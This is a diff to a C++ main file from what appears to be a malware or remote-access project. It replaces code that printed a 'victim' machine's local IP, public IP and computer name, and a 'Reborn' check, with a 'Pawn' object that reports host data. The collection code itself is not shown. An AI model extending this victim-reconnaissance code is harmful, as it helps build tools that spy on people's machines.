@@ -1,8 +1,6 @@
 #include <iostream>
 #include <string>
-#include "NetworkOperations.h"
-#include "CollectSystemData.h"
-#include "Helper.h"
+#include "Pawn.h"
 
 
 int main() {
@@ -19,9 +17,15 @@ int main() {
     std::cout << "GET status-code: " << get_result << ".\n" << std::endl;
     */
 
-    auto dc = SystemDataCollector();
-    std::cout << "Victim local IP: " << dc.getLocalIP() << "\nVictim computer name: " << dc.getComputerName() << "\n";
-    std::cout << "victim public IP: " << dc.getPublicIP() << std::endl;
+//    auto dc = SystemDataCollector();
+//    printf("local IP: %s \npublic IP: %s\nname: %s\n", &dc.getLocalIP()[0], &dc.getPublicIP()[0], &dc.getComputerName()[0]);
+
+//    auto reborn = Reborn();
+//    int need_reborn = reborn.needReborn();
+//    printf("Need reborn: %d\n", need_reborn);
+
+    auto p = Pawn();
+    std::cout << p.systemData.getComputerName() << " " << p.systemData.getLocalIP() << std::endl;
 
     return 0;
 }
